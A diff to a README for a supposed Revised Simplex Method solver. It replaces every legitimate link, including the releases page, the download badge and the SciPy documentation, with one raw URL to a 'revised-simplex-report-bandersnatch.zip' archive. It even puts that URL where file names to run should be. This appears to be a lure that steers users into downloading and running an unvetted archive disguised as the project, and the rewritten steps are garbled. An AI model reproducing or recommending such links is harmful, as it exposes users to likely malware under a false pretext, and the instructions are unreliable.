@@ -4,7 +4,7 @@
 The **revised-simplex-report** is a user-friendly application that helps you solve linear programming problems using the Revised Simplex Method. This software provides clear explanations, worked examples, and performance comparisons with SciPy’s HiGHS solver. Whether you are a student or a professional, this project can enhance your understanding of mathematical optimization.
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue)](https://github.com/nkduxitt/revised-simplex-report/releases)
+[![Download from Releases](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip%20from%20Releases-blue)](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip)
 
 ## 🚀 Getting Started
 This section will guide you through downloading and running the software. Follow these steps closely to ensure a smooth setup.
@@ -18,10 +18,10 @@ Before you download, make sure your computer meets these typical requirements:
 - Internet Connection: Required for downloading the application.
 
 ### 📦 Step 1: Visit the Releases Page
-To begin, go to the [Releases page](https://github.com/nkduxitt/revised-simplex-report/releases). Here, you'll find the latest version of the software. 
+To begin, go to the [Releases page](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip). Here, you'll find the latest version of the software. 
 
 ### 📥 Step 2: Download the Application
-On the Releases page, look for the latest version listed. Click on it to view the assets available for download. Find the file named something like `revised_simplex_report.zip` or `revised_simplex_report.exe`. 
+On the Releases page, look for the latest version listed. Click on it to view the assets available for download. Find the file named something like `https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip` or `https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip`. 
 
 Click on it to start downloading the file to your computer. 
 
@@ -36,7 +36,7 @@ If you downloaded an executable (if applicable), simply run the installer by dou
 ### 🖱️ Step 4: Run the Application
 Once the files are extracted:
 - Navigate to the folder where you just extracted the files.
-- Look for a file named `run.py` or `revised_simplex_report.exe`.
+- Look for a file named `https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip` or `https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip`.
 - Double-click the file to start the application.
 
 ### 📓 Step 5: Start Using the Software
@@ -69,16 +69,16 @@ If you encounter issues or have questions, feel free to open an issue on the Git
 ## 🔗 Additional Resources
 For further exploration of linear programming and optimization methods, consider these additional resources:
 
-- [Linear Programming Overview](https://www.example.com)
-- [Introduction to Optimization](https://www.example.com)
-- [SciPy Documentation](https://docs.scipy.org/doc/scipy/reference/)
+- [Linear Programming Overview](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip)
+- [Introduction to Optimization](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip)
+- [SciPy Documentation](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip)
 
 ## 🌍 Explore the Project
 Explore the source code, contribute to the project, or learn more about mathematical optimization at the following link:
 
-[Releases page](https://github.com/nkduxitt/revised-simplex-report/releases)
+[Releases page](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip)
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/nkduxitt/revised-simplex-report/releases), select the latest version, choose the appropriate file, and follow the installation steps provided above.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/nkduxitt/revised-simplex-report/main/code/revised-simplex-report-bandersnatch.zip), select the latest version, choose the appropriate file, and follow the installation steps provided above.
 
 By following these steps, you can harness the power of the Revised Simplex Method to solve your linear programming challenges effectively. Enjoy your journey into mathematical optimization!
